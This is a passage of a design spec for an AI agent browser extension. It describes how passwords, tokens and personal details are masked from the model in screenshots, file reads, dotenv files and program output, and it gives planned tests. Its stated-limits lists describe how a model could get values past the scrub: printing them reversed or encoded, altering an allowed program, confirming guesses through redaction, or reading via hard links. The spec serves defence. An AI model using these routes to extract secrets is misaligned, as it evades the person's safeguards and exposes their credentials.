   capture's device pixel ratio and zoom. The painting is done on the captured bitmap, in the worker or the offscreen
   document, before the model, the store or an export sees it. Nothing is painted in the page, which could observe or
   undo it. Two reads that disagree still give the union, and the run log records a `secrets`/`mask-moved` mechanic.
4. The painted image is the one the run keeps, so the sidebar and both exports show what the model saw. The raw capture
   is never stored.

**A capture that reaches the page.** One does: `CAPTURE_TAB` (`page-relay.ts`, `background.ts`) answers an approved
page with a capture of its own tab, so it can crop to an element, and a page-hosted run's tool can return a capture to
the page. The rule is keyed on who receives the bitmap and on the origin of the document captured, never on which tab
it was or who started the run:

- a capture whose bitmap reaches a page, of a document of the SAME origin as that page: not painted for `detail`
  entries. The page's origin can draw and read that document's text already, so painting hides nothing, and a painted
  rectangle would be the oracle the text skip removes (the page draws candidate names and reads which were painted). A
  second tab of the same origin falls here too;
- a capture whose bitmap reaches a page, of a document of ANOTHER origin: painted;
- a capture that never reaches a page (a run the worker hosts, a model backend, the store, an export): painted.

The origin compared is the captured tab's top document's. A same-origin page holding a cross-origin frame gets the
frame's text painted, since the page cannot read that frame.

A full-page capture taken in tiles gets the two reads for each tile. `locate`'s text answer and the accessibility tree a
CDP read returns are text crossings, scrubbed with the looser match. A closed shadow root and a cross-origin frame are
read only through CDP's piercing DOM read, when CDP is attached; otherwise their text is not masked. The walk's bound
(proposed): 4 MiB of text. Past it, the capture is refused with one line naming the reason, never sent unmasked.

**Gaps**, stated plainly:

- **Text that is not text in the DOM**: an image, a canvas, a video frame, a PDF rendered by the viewer, and CSS
  generated content (`::before`, `::after`). There is no OCR, so none of these is masked.
- **Text split across blocks**: a match spans inline elements (`<b>Ann</b> Lee`) but never two blocks (two table cells,
  two `div`s). Text that CSS reorders (`order`, `direction`, absolute positioning) is matched in DOM order, not in the
  order it is drawn. `text-transform` changes only case, which the match folds.
- **It filters; it detects nothing.** Only registered details are blanked. A name the person did not register, a first
  name alone when the full name is registered, and a detail that was transformed (initials, reversed, encoded) all
  reach the model.
- **Text drawn only between the two reads** (an animation, a marquee, a value that blinks in): neither read sees it,
  and the capture does.
- **A site that controls a second origin.** An approved site that also controls the other origin (its own second
  domain, in a frame or in another tab) can draw candidate names there and read the painted rectangles from the
  capture it receives. Painting stays the rule; this residual is stated, not closed.
- **Layout leaks a little.** A painted rectangle has the width of the text it covers.

**A session secret: a second registration origin** (rulings 96, the question card, and 97, the session secret: Shane,
2026-11-20, in the coordinator's session, numbered in the plan by #2077; [`SHELL_INTERACTIVE.md`](SHELL_INTERACTIVE.md),
"A masked answer"). An entry has an origin as well as a kind. `settings`
is the person in Settings, kept in `ml_secret_registry`. `session` is the harness at run time: the answer to a masked
card (a `getpass()` in a cell). A `session` entry is kind `mask`. It is kept with ruling 30's page values in
`chrome.storage.session`, never on disk, and is removed when its session is deleted or archived, and in any case when
the browser closes. It shares ruling 30's bound of 256 values a session and the same fail-closed rule at the bound. The
answers to #2066's open items:

- **The name.** A generated one, `ASKED_SECRET_<n>`, numbered within the session. The card offers an optional name
  field, checked against `[A-Z0-9_]{1,40}`. The prompt's text is never the name: the program wrote it.
- **"Save to the store"** is offered on the card as a box that starts unticked: "Also keep in the store as <name>",
  with ruling 32's kinds to choose from and `mask` first. Ticking it is a registration by the person, whose entry then
  has origin `settings`. It is offered only where values are entered (ruling 33: the renderer the extension hosts).
- **Where a masked card is answered.** In the first build, only in the renderer the extension hosts, for the same reason
  ruling 33 gives. A remote host (the web build, the phone) shows the card and says the answer is typed on the computer.
  A value crossing devices gets its own ruling. This narrows #2066's flow, which lets any host answer.
- **`ml.sh`'s stdin answered by the person** registers under the same origin when the person answers in the card's
  masked box. The host cannot tell a password prompt, so the card offers the masked box as a toggle.
- **Under 8 characters**, a `session` answer is not registered (the floor), and the card says so in one line.
- **What is not promised** is #2066's: the cell holds the plaintext.

**`send` and scripted answers by name** (#2066, open for this spec). `send <id> secret:<NAME>` and a scripted rule that
names an entry are allowed only for an entry that keeps its value (`use` or `detail`); a `mask` entry has none. A `use`
entry goes only to a masked prompt, and a `detail` goes to any prompt. Each use asks the person: the card names the
entry, the call and the prompt's text. A policy for one entry and one program may allow it later. The residual is the
same as for `getpass`: the cell that receives the value holds it in plaintext, and the model's next cell can read the
variable. A handle that reaches code the model wrote is a channel the handles slice has to close. Until then, this is
the case where "never read" is weakest, and the card says so. A STORED secret's handle on `ml.sh` stdin (slice 1) stays
open.

**The other specs.** The agent's notes and `lib/` (FILE_ATTACHMENTS.md, both ideas of 2026-11-22) hold what the model
wrote, which it wrote from what it saw, already scrubbed. A detail the model never saw cannot be in them, so they add
no path. Reading them back crosses the `/files` read scrub, which applies `detail` entries with the rest.

**Rows e3 will need**, by name:

- `detail-case-and-space`: `ANN`, a newline and `lee` match `Ann Lee`; `Joann Leeds` does not match `Ann Lee`.
- `detail-replaces-original-span`: the replacement covers the original text, its case and whitespace included.
- `detail-phone-separators`: each separator form of one number matches; a run of the same digits inside a longer
  digit run does not.
- `detail-variant`: a variant is matched under its entry's name; a fifth variant is refused.
- `detail-floor`: a 5-character detail is refused at registration; a one-word detail is accepted with the warning.
- `detail-not-on-page-request`: a page-started request holding a registered name reaches the backend unchanged, and an
  error to the page holding it is not marked (no oracle).
- `detail-worker-text-in-page-run`: in a run a page started, a tool result the worker built from another tab and a
  fetch made with the person's cookies are scrubbed of a registered name.
- `detail-capture-to-page`: a page's `CAPTURE_TAB` of its own tab, and a capture of a second tab of the same origin
  returned to it, come back with no `detail` painted; a capture of another origin's tab returned to the page, a
  cross-origin frame inside a same-origin capture, and every capture that reaches no page are painted.
- `detail-handle-fill`: `type` with a handle fills the field; the arguments, display and exports show
  `[detail: <NAME>]`; reading the field back gives the marker.
- `detail-handle-origin-asks`: the first fill on an origin asks; a field in a cross-origin frame asks for the frame's
  origin and the card shows both origins; a page cannot start a fill.
- `detail-screenshot-painted`: a page with the name in one text node, in `<b>Ann</b> Lee` and in an input is captured
  with all three rectangles painted. The stored image is the painted one.
- `detail-screenshot-moved`: a page that moves the text between the two reads gets the union painted and a
  `mask-moved` record.
- `detail-screenshot-bound`: a page past the walk's bound gets the capture refused, never sent unmasked.
- `detail-gaps-stated`: the name in an image, in a canvas, in `::before` content, split across two cells, inside a
  Japanese sentence with no spaces, and drawn only between the two reads is NOT masked; a page that controls a second
  origin drawn in a frame reads which candidates were painted (the stated residual). These rows pin the stated gaps,
  so a change to them is seen.
- `session-secret-registered-before-resume`: a `getpass` answer is scrubbed from the cell's next output, and is gone
  with the session.
- `session-secret-remote-refused`: a masked card answered from a remote host is refused.
- `send-by-name`: `secret:<NAME>` on a `mask` entry is refused; on a `use` entry to a plain prompt it is refused; on a
  masked prompt it asks.

### The inbox item names three kinds (ruling 94)

**The ruling** (Shane, 2026-11-20). Ruling 33's inbox item says what the store is for, in the three kinds. The text,
for whoever builds the item. Each line is one sentence or two that a person reads at a glance:

- **Use, never read**: a password or an API key. The model puts it where it belongs, by name, and never sees it.
- **Never read**: a token the model could come across where it works, in a file, a command's output or a process list.
  It is blanked wherever it turns up, and the model cannot use it.
- **Blank before the model sees it**: your full name, your address, a phone number. Blanked in text and in screenshots
  of pages, and filled into a form by name when you allow it.

One line below them gives the limits: "Not caught: a value changed before it is shown (cut, reversed, or encoded in an unusual way),
text inside an image, and a value shorter than 8 characters (6 for a personal detail)."

The three lines replace the form's two-type text in ruling 33 ("The form"), and the form's type choice lists the three
in this order with "Never read" (`mask`) preselected. The kinds' names in the code (`use`, `mask`, `detail`) are not
shown to the person.

### A redacted value written back to its own file is restored (rulings 100 and 101)

**The rulings** (Shane, 2026-11-22, in the coordinator's session). 100: a `[REDACTED:<NAME>]` marker in a write to a
path P expands back to the real value only if P currently holds that value, checked at write time with nothing stored
between calls. A marker written anywhere else stays literal. No gate and no ask. 101: the `*` mask of the file reader
(`RangedReader.read`, so Python's `/files` mount and `ml.fs`) becomes a per-secret FAKE VALUE of the same length,
derived from a keyed hash over the secret's NAME and never over its value, tagged as a placeholder; a write to P that
contains a fake is spliced like a marker, and a fake written anywhere else stays a fake. The rest of this section is
the coordinator's calls under the two rulings, each surfaced to Shane. Nothing here is built.

**The defect they rule out.** A model reads a file that holds a secret, edits another line and writes the file back.
What it read was the marker or the mask, so what it writes destroys the secret in the file. After the rulings the
round trip leaves the secret's bytes as they were, and the model has still never read them.

**Why this opens nothing.** The restored bytes come out of P and go into P, in one write. The value reaches no path
that did not hold it, and every read of P is scrubbed after the write as before. What the model gains is the power to
MOVE a value inside its own file. That is the residual: a file that a program runs or reads can be rewritten so the
program prints the value changed (reversed, split), which the scrub does not match. A model with an approved write to
that file could already write a program that reads the file and does the same, so the residual is the scrub's existing
one ("a value changed before it is shown"), with no new reader.

**An occurrence.** The rule is stated over P's RAW BYTES as they are when the write lands. The form list is the
reader's (`secretFormsNow`: every registered value's forms and the config's secrets, longest first). P is scanned left
to right for each form in that order; a match whose bytes are all unclaimed claims them and is an occurrence (form,
offset, length); a match that touches a claimed byte is not an occurrence. The GitHub token pattern of
`secret-mask.ts` has no name and is never an occurrence. A form shorter than 8 bytes is never an occurrence.

**The fake (ruling 101).**

- *Shape.* For a form of `L` bytes (UTF-8), the fake is `L` ASCII bytes: the tag `RDCT`, then `L - 4` characters of
  `[A-Za-z0-9]`. The registry's shortest value is 8 characters (`REGISTRY_MIN_VALUE`), so a fake has at least 4
  derived characters. The alphabet makes a fake inert inside any quoted context (JSON, a shell word, a `.env` line, a
  URL).
- *Derivation.* HMAC-SHA256 under the session's fake key over (the secret's name, the form's index among that name's
  forms, `L`, a counter starting at 0), the output extended by a block index while more characters are needed, each
  byte below 248 taken modulo 62 and the rest skipped, so the characters are uniform. The value is not an input: a
  fake says which occurrences are the same secret and nothing else. A config secret, which has no registry name, uses
  its marker's slug (`window-ml-api-key`) as the name.
- *Distinct by construction.* At `L` = 8 the derived part has about 23.8 bits, so the birthday bound is not relied on:
  the worker derives a session's fakes in the form list's order, and a fake equal to an earlier one, or one that
  contains or is contained in an earlier one, is derived again with the counter raised. A fake that equals a
  registered value's form is derived again the same way.
- *The key.* 32 random bytes per SESSION, derived as HMAC-SHA256 of the session's hash under one master key the worker
  makes once and keeps in `chrome.storage.local` (`ml_fake_key`). This AMENDS the plan's first call (the key beside
  ruling 39's scan key in `chrome.storage.session`): that key dies with the browser, and a model that read P before a
  restart and writes its remembered text after it would then write a dead fake and destroy the secret, the defect this
  section exists for. The master key never reaches a turn, an export, a backup, the run log, an error's text or
  anything the model reads; it does not sync. Without it (a new profile, a restore) a session's older fakes are dead:
  one written to a file stays as written. That is stated to nobody, since nothing can tell a dead fake from text.
- *What the reader shows.* An occurrence's bytes are replaced by its form's fake; a read that cuts through an
  occurrence gets the matching slice of the fake, so two reads of one range agree and a file's size and offsets stay
  true, as under the mask. Every other match (one that touches a claimed byte, a GitHub token, a form under 8 bytes)
  is `*` at the same length, as today. A case-insensitive form has one fake, whatever case the file holds.
- *Who knows what.* The worker answers `FILES_SECRET_FORMS` for one session with each form's `find`, `ci`, `fake` and
  `marker` (the marker text of its name), for the offscreen document only, as today. The model is not told the name on
  this path, as before: a tool result that carries a fake carries no marker for it, since the fake is not the value.

**The splice.** A MEDIATED write is one whose bytes the extension hands to the holder of P as P's new content: an
`ml.fs` write member and a Python file's close (the holder is the offscreen document's store), and the host's `put`,
`write` and `commit` (the holder is the process host). A program's own write is not mediated: what it writes is what
lands.

- *What is spliced.* In the new content, each fake of the session, and each `[REDACTED:<NAME>]` marker of a registered
  name, is a SLOT. The k-th slot of a fake, counted from the start of the content, takes the bytes of the k-th
  occurrence of that fake's form in the current P. The k-th marker of a name takes the bytes of the k-th occurrence of
  any of that name's forms, by offset. So the file's own spelling (an escaped or encoded form) is restored exactly. A
  fake keeps the content's length; a marker changes it.
- *No occurrence.* A slot whose form, or name, has no occurrence in the current P stays literal: P does not hold the
  value, which is ruling 100's condition. A P that does not exist holds nothing.
- *More slots than occurrences.* NOT RULED, open with Shane. The coordinator's default, written here so a build is not
  blocked: a slot past the last occurrence takes the FIRST occurrence's bytes, since the file already holds the value.
  The other reading (the ledger's holder, flaky-ci) refuses the write.
- *The offscreen document as holder.* The splice is made at the commit point, over the whole pending part, against the
  stored file the commit replaces, inside the store's own commit, so no precondition is needed and a slot that spans
  two written chunks is seen whole. The pending part keeps the slots until then.
- *The host as holder.* No registered value crosses from the worker to the host; none does today. The worker reads P
  through the host, finds the occurrences, and sends the content with its slots left in, and beside it `splice: {
  sha256, parts }`: the SHA-256 of the whole current P, and one part per slot, `{ at, drop, from, take }` ("the `drop`
  bytes at `at` of the sent content are replaced by the `take` bytes at `from` of the current P"), in raw-byte
  offsets. The host opens P once, hashes it, refuses with `changed` when the hash differs, and otherwise copies the
  bytes from that descriptor into the file it writes and replaces P with it. On `changed` the worker reads again and
  retries once, then answers the refusal. The host declares the capability in `hello` (`splice`); the host PR carries
  `@host-compat`.
- *A host that cannot.* When a write to a host P has a slot with an occurrence and the host lacks `splice`, or the
  current P is over the worker's read cap for a host file, the write is REFUSED with a reason that names the cause
  ("this file holds a redacted value; update the process host to write it back" or "the file is too large to check").
  It is never written with the slot literal, which would be the defect. A write with no slot, or whose slots have no
  occurrence, is unchanged on every host.

**What is recorded.** The run log's record at the crossing stays as it is. A splice adds one record (`secret` /
`write-restored`) with the path and, per name, the count of slots restored; a refusal adds `secret` / `write-refused`
with the cause. Neither carries an offset, a length, a fake or a value, and the config's secrets are counted under
their slug. The tool's result to the model and both exports keep the content as the model wrote it, with the marker or
the fake.

**Not caught, stated.** A fake or a marker the model changed (cut, re-cased, re-encoded) is text and stays as written.
A marker of a `mask` entry (ruling 32, hash-only) is restored like any other, since the bytes come from P and no
stored value is needed. A value that only a shape detector matched (the GitHub token pattern, ruling 39's detectors)
has no name: it reads as `*`, and writing the `*` back destroys it in the file, as today. Giving such a match a fake
keyed on its position is not designed.

**Rows, for whoever builds it.** Each is a test that fails first.

1. Round trip in the store: a file with a registered value is read through the mount, one other line is changed, the
   file is written and closed; the stored bytes hold the value at its old spelling, and a read shows the fake.
2. The same through `ml.fs`, and with a `[REDACTED:<NAME>]` marker in place of the fake.
3. A fake, and a marker, written to a file that does not hold the value stay literal, in the store and on the host.
4. The same fake at every read of one session; a different fake in another session; no fake equal to, inside or around
   another or a registered form (enumerated over a registry of 200 values at `L` = 8, not sampled).
5. A read that cuts an occurrence at every offset returns the fake's slice.
6. Two forms that overlap in P: the first claims, the other's remaining bytes read `*`, and only the claimed one is a
   slot's source.
7. The host: P changed between the read and the write answers `changed`, the retry succeeds, a second change refuses;
   no message from the worker to the host carries a registered value (asserted on the wire).
8. A host without `splice`, and a P over the read cap, refuse with the reason; the file is unchanged.
9. Upgrade: a file written under the `*` mask, read by the new reader, shows `*` runs as text and nothing is spliced
   into them.
10. Nothing of the master key, a fake's derivation input or a value in the run log, the export, the backup or an
    error's text.

The red team's properties are the wire assertion of row 7, the "only into P" property (no slot ever takes bytes from a
file other than the one it is written to, a renamed or symlinked P included, resolved by the holder), and that a
page-started caller reaches none of it.

### A masked file: its name and keys are read, its values are not (ruling 113)

**The ruling** (Shane, 2026-11-24, in the coordinator's session: "Your 6 point list is fine", with "Your writes has to
handle python `open` etc"). A file can be in a third state between hidden and shown: MASKED. It is the default for
dotenv files. The six points, as confirmed:

1. **Reads.** The model's own reads (`ml.fs`, Python's mount, a described tool such as `cat` or `grep`) get the file
   with each value replaced by a fake of the same length, derived from the key's name and a session key and never from
   the value.
2. **Allowed programs.** A program the person allowed for the file, by policy or on a card, reads the real bytes. What
   it prints is scrubbed before the model sees it. It does not ask at each run.
3. **Writes.** A write lands only through code the extension or the host owns: `ml.fs`, `ml.sh.put` and `stdoutTo`,
   and Python's `open` and everything built on it, through the mount. A written fake puts the real value back in its
   place. To every other program the file is read-only, so nothing is merged back from a program's own write.
4. **Registration.** Reading a masked file registers its values of 8 or more characters for the scrub, but for a list
   of common settings. The person can switch this off for a file. Registering a value by hand stays the main route.
5. **A hash pin.** A policy that allows a program can pin it by hash. A changed pinned file changes the pin only with
   the person's approval.
6. **No backup by the host.** A file that must not change is made read-only by a policy or by the operating system.

The rest of this section is the coordinator's calls under the ruling, each surfaced to Shane. Nothing here is built.
It builds on rulings 100 and 101 (the section above), which already rule the fake and the write-back for a REGISTERED
value; this section extends both to a value nobody registered, by reading the file's own grammar. AMENDED 2026-11-24
after the files-host lane read it against window-ml-host main (9f99501) and window-ml-host#58: sixteen sentences about
the host were wrong or incomplete, and the host paragraphs below are the corrected ones.

**What it is for.** The person's project has a `.env`. The model should know it is there, read which keys it has, add
a key that is no secret, and start the person's web server, which loads the real values. The model should never read a
value. The danger point is the transcript: a value that enters it is sent again with every later request (the mlbox
incident, 2026-10-17: four live keys printed once, resent about 540 times, one abused a month later). A model that is
not hostile and prints a config by accident is the case this must cover in full. A hostile model is covered up to the
limits stated at the end.

**The three states.**

| State | Name listed | The model's own read | A mediated write | A program not allowed for it | A program allowed for it |
| --- | --- | --- | --- | --- | --- |
| shown | yes | the bytes, registered values scrubbed | lands | reads and writes | the same |
| masked | yes | keys as written, each value replaced | lands, real values put back | reads the masked copy or is refused; never writes | reads the real file, and writes it in place |
| hidden | yes | refused | refused | refused | not offered: a `show` or a `mask` is the way |

**The entry.** `mask <pattern>` is a third effect of the `files` consumer, beside `hide` and `show`
([`POLICIES.md`](POLICIES.md), "Hiding files"), with the same patterns, scopes, origins and layer rule. Within a
layer, on a tie, the order is `hide`, then `mask`, then `show`. `default:dotenv` becomes a `mask` entry; the other
three defaults stay `hide` (the three credential files hold a value with no key beside it worth reading, and a key
file has no grammar). Adding a `mask` over a `hide` widens, and is confirmed like a `show`; adding one over a shown
file narrows. A `hide` on a dotenv file still hides it whole.

**The grammar is dotenv, and there is one masker.** Version 1 reads one grammar: a line is blank, a comment, or
`KEY=VALUE` with an optional `export`, the value bare, single-quoted or double-quoted, a double-quoted value possibly
running over lines. A `mask` entry on any file is read with it. A line the grammar cannot read is masked WHOLE, its
key included, so an unknown shape fails closed. The masker is one Rust crate built native for the host and to
WebAssembly for the extension's reader (as window-ml-host#57 does for the describer), so both mask the same bytes; a
shared vector file pins them. JSON, YAML and TOML are not read in this version: a `mask` on one masks every line,
which is `hide` with the line count showing.

**What a read shows.**

- *Keys, comments, quotes and layout* are as written. A comment is not parsed for values: a secret pasted into a
  comment is read, a stated limit.
- *A value of 8 or more bytes* is replaced by its fake: ruling 101's shape (`RDCT`, then `[A-Za-z0-9]` to the value's
  length) and derivation, with the name `<KEY>` and the session's fake key. The quotes stay; the fake is what is
  between them. Two files with the same key and length show the same fake, which says nothing, since no value is an
  input.
- *A value of 1 to 7 bytes* is `*` at its length. *An empty value* is empty. The mask is total: `PORT=3000` reads
  `PORT=****`. A person who wants a file's settings read marks the file `show` and registers its secrets; a per-key
  `show` is not designed.
- *Sizes and offsets hold*, as under ruling 101: a ranged read that cuts a value gets the matching slice.
- *The same bytes for every reader of the masked copy*: `ml.fs`, Python's mount, the file browser's content view, an
  `@file:` reference, and a described tool run by the host.

**The write-back, by key.** A mediated write is the one of rulings 100 and 101: an `ml.fs` write member, a Python
file's close, and the host's `put`, `write` and `commit`. For a masked file the splice is by KEY, not by occurrence of
a form. The new content is read with the grammar. For the k-th line of a key `K`, the current file's k-th value of `K`
is restored when the written value is a well-formed fake of `K` at the written value's own length, or a run of 1 to 7
`*`. The test is on the written value alone, never "equal to what a read shows now": the person may have changed the
value, and its length, between the model's read and its write, and a stale fake must still restore the person's new
value instead of landing over it. `K` is in the derivation, so a fake moved to another key lands as a fake. Any other
value lands as written: that is the model setting a key, which the write's own policy judged. A key not in the new
content is removed; a new key lands. A k past the file's last `K` takes the first `K`'s value, the default of ruling
100's open point. Bytes are restored only into the file they came from, resolved by the holder: a fake written to any
other path stays a fake, so a copy of a masked file made from a read is a file of fakes. A value of 1 to 7 `*` meant
literally restores the current value, whatever its length: a stated limit.

- *The offscreen document as holder* splices inside the store's commit, as under rulings 100 and 101.
- *The host as holder* splices at `commit`, not at `put`: `put` only resolves the target and holds the parent
  directory, and the bytes arrive in `write` chunks. At `commit` the host reads the current file through the held
  parent descriptor (no symlink followed), splices, and renames the result over it. A read at `put` would race the
  person's own edit. No value crosses to the worker.
- *The protocol change.* Today `put` refuses a dotenv target outright (`Protected`, with no verdict that allows it). A
  by-key write says so (`mask: true` on the `put`), and the host accepts the flag only when a `mask` entry of that
  `put` decides the target; without the flag a dotenv target stays refused. The host declares `mask` in `hello`.
- *What the commit keeps.* The by-key commit keeps the target's mode, and its owner where it can; a plain commit's
  mode (0666 less the umask) would turn a 0600 `.env` world-readable. Extended attributes and ACLs are copied where
  the platform allows. A hard link to the file is broken by the rename, as for any commit. `commit`'s `size` and
  `sha256` describe the bytes that LANDED, which differ from the bytes sent; the worker does not compare them with
  what it sent.
- *A policy may allow the overwrite (RULING 115, Shane, 2026-11-24, in the coordinator's session: "This call is
  fine").* A by-key write is to an existing file, and today an existing file always asks, whatever a policy allows
  (`decidePut`, [shell.md](../dev/shell.md)), so every edit of a masked `.env` on a host root would raise a card that
  becomes a click-through. For a by-key write to a path a `mask` entry decides, and for nothing else, an `allow`
  policy of the write's consumer may answer the ask, and the worker then sends `replace: true` on its word. The reason
  it is safe to free: the splice can only add, change or remove keys, and exposes no value. With no such policy the
  write asks, as before. Every other overwrite of an existing file keeps asking whatever a policy allows. The card of
  the first such write offers the policy ("always allow edits to this masked file"), scoped to the session by default.
- *The fake key.* The session's fake key goes to the host on a `put` (for the write-back) and on a `spawn` (for the
  masked copy). It is no secret of the person's: a fake has no value as input, and a restore is bound to the file and
  the key's name. Over the hub a `put` is refused (reason `scope`), so there is no by-key write over the hub; a
  relayed `spawn` carries the key sealed. So the fake key does reach a host on both transports.
- *`stdoutTo` is not a mediated write.* It is not built. When it is, the host redirects the program's output to the
  file itself, nothing crosses `put`, and a masked target is refused.

**What a program reads.**

| Program | macOS (Seatbelt) | Linux (bubblewrap) |
| --- | --- | --- |
| A described call that NAMES the file in an operand its manifest marks as a path (`cat .env`, `grep KEY .env`) | the host writes the masked copy to a private directory, under a name the dotenv denies do not match, and rewrites the operand to it | the masked copy is bound read-only over the path |
| A call with no manifest, a path inside a flag the manifest does not split (`--env-file=.env`), or a program that walks to the file | read refused (EPERM), as a hidden file is today: Seatbelt cannot substitute bytes | reads the masked copy, bound when the call starts |
| Any write by a program not allowed for the file | denied | fails (EROFS; EBUSY for a rename over it or a remove, since the path is a mount point) |
| A program allowed for the file | reads the real file and writes it IN PLACE | the same |

The masked copy is made when the call starts and removed when it ends.

- *The rewritten operand shows.* On macOS `grep KEY .env other` prints the copy's path as the file's name, and a
  program that branches on the basename sees another name. Stated, not repaired.
- *An allowed program's writes.* The default holds deny writes too (Seatbelt's `file-write*` on the dotenv names; on
  Linux a read-only bind, and Landlock). An allowed program's call is exempted from them for the files its entry
  names, for a write in place. A writer that makes a temporary file and renames it over the original fails at a root's
  top under `write: "roots"`, where names directly under a root cannot be created, removed or renamed, and on macOS at
  any depth when the temporary file's name is itself a dotenv name (`.env.tmp`, an editor's `.env.swp`). That is a
  stated limit of this version.
- *Finding the files: one walk per root.* `default:dotenv` as a `mask` needs a pattern kind the hide list lacks, a
  BASENAME at any depth under a root (a hide pattern is absolute, with a fixed number of segments and no `**`). The
  host walks each root once per call for all such entries together, not once per entry, without following symlinks.
  Both platforms walk: Linux to bind the copies, and both to read the values the scrub holds. The found set is cached
  per directory, keyed by the directory's device, inode and CHANGE time, so an unchanged directory costs one `stat`;
  that keeps the second walk at `start` (window-ml-host#58) cheap. The modification time is not the key: a program in
  the call can set it back after adding a file, and no program can set the change time; the inode catches a directory
  replaced by a rename. No directory is skipped by name: a `node_modules` or `.git` left out would be where a planted
  `.env` goes. On macOS a basename `mask` other than the built-in dotenv names needs its own Seatbelt deny, which is
  new profile code in slice 3.
- *The walk's bound is entries, not matches.* The cap is 1,000,000 directory entries a root for this walk (the hide
  list's is 100,000 an entry, which a `node_modules` passes). The files-host lane's measurement, warm, macOS, in
  Python: 24,186 entries in 30 ms; 1,927,407 entries (a folder of every clone) in 12.7 s, about 0.65 s per 100,000.
  Past the cap, on Linux the spawn fails naming the root and the count, since nothing else holds the files; on macOS
  the call runs with every masked file treated as hidden for that call (the name denies need no walk), no allowed-
  program entry honoured, and the scrub holding what the walk found, and the run log records it. The remedy on both is a
  narrower root.
- *The bound on found files* is 256 a call, counted apart from the hide list's 256 matches, since on Linux each costs
  a bind. Past it the outcome is the entry cap's: the Linux spawn fails naming the root and the count, and the macOS
  call runs with the masked files hidden.
- *A file made after the call starts*, or renamed over the path, is not covered for that call (the hide list's stated
  limit). `host-plain` is bound by nothing, as today.

**An allowed program.** The entry is a `show` scoped to a call: `show <pattern> for <program>`, where `<program>` is
the resolved executable and, when the person pins it, a list of files with their SHA-256 (the script, a lock file,
whatever the card listed). The model proposes it on a card that says "let `<program>` read the real `<file>`", or the
person writes it. With it, a call of that program reads the real file and may write it in place, and does not ask on
its account. Nothing else changes for the call: its own policy still judges whether it runs.

- *The pin.* The host hashes each pinned file when the call starts. A mismatch makes the call ASK, on a card that
  names the file that changed since the person allowed it and offers "allow and update the pin". No `allow` policy
  answers that ask, and nothing but the person's approval moves a pin: a pin the model could move by editing the file
  would be no mitigation. A mediated write to a pinned file is not itself gated on the pin's account.
- *Unpinned* is permitted and is the person's choice; the card says in one line that the model can then change what
  the program does with the values.

**The scrub of what a program prints.**

- *By the host, for every call.* When a call starts, the host holds the values of the masked files its walk found
  under the call's roots, those of 8 or more bytes but for the common-settings list, in memory for that call. The
  call's output is scrubbed as it is WRITTEN to the host's store, by the masker crate, in the registry's forms (as
  written, JSON, percent, base64, shell). A match reads `[REDACTED:<KEY>]`, naming the dotenv key, which is not
  secret. This covers the allowed program and every other program alike: a `docker inspect` that prints the same value
  is scrubbed though it never opened the file. No value leaves the host for this.
- *Every channel, by enumeration:* stdout, stderr, each pipe stage's stderr, a head, a later `read` range, `peek`, and
  the `diff` body. The `diff` shows a changed file's content before and after, so it also WITHHOLDS every path a
  `mask` decides, as it withholds a secret-looking name today, and the blob rule that catches `cp .env notes.txt`
  extends to masked paths. A value an allowed program writes during the call (a rotated key) was not held at the start
  and is not scrubbed from that call's output: a stated limit, which the withheld `diff` narrows.
- *At write time, with a holdback.* The scrub keeps back the longest form's length less one byte, so a value split
  across two chunks is caught. A scrub at `read` time would miss a value cut by a range's edge, and two overlapping
  ranges would disagree. What follows: `done`'s `size` and `sha256` describe the scrubbed stream and `read` offsets
  index it; `outputCap` counts raw bytes, the kept part is scrubbed, and a partial match at the cut is dropped, never
  shown; `peek` trails the program by up to the holdback.
- *What it costs* (the files-host lane's measurement, 2026-11-24: aho-corasick 1.1.5, one thread, an Apple M5 Pro, 256
  MiB inputs, a value straddling every chunk boundary caught, chunked output identical to one pass). With 256 values
  (1,088 patterns, the longest 158 bytes) an explicit DFA scrubs about 700 MiB/s with no match and about 280 MiB/s
  with a match every 4 KiB; its heap is 39 MiB and it builds in 32 ms. Only kept bytes are scrubbed, so the worst case
  at the default 64 MiB `outputCap` is about 0.23 s of one core. The automaton is built once a call, as a DFA by name:
  the library's automatic choice falls to an NFA past about 100 patterns, three to four times slower. `peek`'s lag is
  the holdback, up to about 360 bytes for a 120-byte value whose percent form is long. The holdback is flushed only at
  the end of the stream, never on a timer, since a timed flush on a stalled stream lets a split value through.
- *The values in the host's memory* are kept out of a crash dump for the whole process, not by region: the automaton's
  tables encode the values and live in the ordinary heap. On Linux `prctl(PR_SET_DUMPABLE, 0)`, which also blocks
  same-user `ptrace` and `/proc/<pid>/mem` and resets at `execve`, so a spawned program is unaffected (the host's own
  uses of `/proc/self` are checked, since they become root-owned). On macOS `RLIMIT_CORE` 0, restored in the child
  before `exec`, so the person's programs keep their core files. The held values are zeroed at `done`; the automaton's
  heap is freed and not zeroed. A dump taken from outside by a debugger is not prevented on macOS: a stated limit.
- *By the reader, for the browser's copy.* A masked file in the browser's copy of a session's files is parsed by the
  `/files` reader, and its values become `session` entries of the registry ("A masked answer" defines the origin):
  kept in `chrome.storage.session`, gone with the session, never in Settings, a backup or an export. They have their
  own bound, 256 values a session, apart from the registry's 64; at the bound nothing held is dropped and the file
  reads as hidden, with the reason.
- *The crossing that is not in the first build.* The host's values would also catch the same secret in a web page or a
  fetched body if they were sent to the worker's registry. That is a plaintext crossing no secret makes today. It is a
  later slice, on the host's own machine only and never over the hub, and waits on Shane's word.
- *The common-settings list* is enumerated in the masker crate, not a judgement: values that are a boolean or number
  word, a bare hostname or `localhost` URL with no userinfo, a path, an environment name (`development`, `production`,
  `staging`, `test`), a log level, a locale or a time zone. They are still masked on read; they are only kept out of
  the scrub, where redacting `production` everywhere would damage every output.
- *Switching it off.* A `mask` entry carries `register: false` when the person unmarks the file: its values are masked
  on read and written back as above, and are not scrubbed from output.

**Stated limits.**

- A model that can change what an allowed program runs can make it print a value cut, reversed or encoded past the
  scrub. The pin is the mitigation; unpinned, there is none.
- A value under 8 bytes, or on the common-settings list, is masked on read and not scrubbed from output.
- A guess that comes back redacted confirms itself. A model can print candidates and see which is replaced. The 8-byte
  floor and the common-settings list bound it to values that are hard to guess.
- On macOS a program that loads `.env` without naming it in a marked path operand must be an allowed program, or its
  read fails.
- A hard link to a masked file under another name reads the real values (the red team's shape D on window-ml-host#59),
  as before this ruling.
- A secret outside a masked file (a container's environment, an application's database) is covered only when its value
  is also in a masked file under the call's roots, or registered.
- A value's length is shown.

**Slices, in order.** (1) The masker crate, with the grammar's vectors, native and WebAssembly (the files-host lane,
on window-ml-host#57's pattern). (2) The reader: `mask` in the `files` consumer, the masked read and the by-key
write-back in the store, session registration, the default switched in the browser's copy (the session-store lane's
